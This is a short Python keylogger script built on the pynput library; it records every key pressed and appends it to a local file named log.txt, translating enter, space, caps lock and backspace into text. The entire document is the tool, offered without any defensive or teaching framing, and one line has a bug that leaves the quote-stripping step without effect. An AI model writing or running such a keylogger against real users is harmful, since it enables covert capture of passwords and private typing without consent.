from pynput.keyboard import Listener

def write_to_file(key):
    key_data=str(key)
    key_data==key_data.replace("'","")

    if key_data == 'Key.enter':
        key_data='\n' 
    
    if key_data=='Key.space':
        key_data=' '

    if key_data=='Key.caps_lock':
        key_data=' caps '

    if key_data=='Key.backspace':
        key_data=' remove '





    with open("log.txt","a") as f:
        f.write(key_data)

with Listener(on_press = write_to_file) as l:
    l.join()        
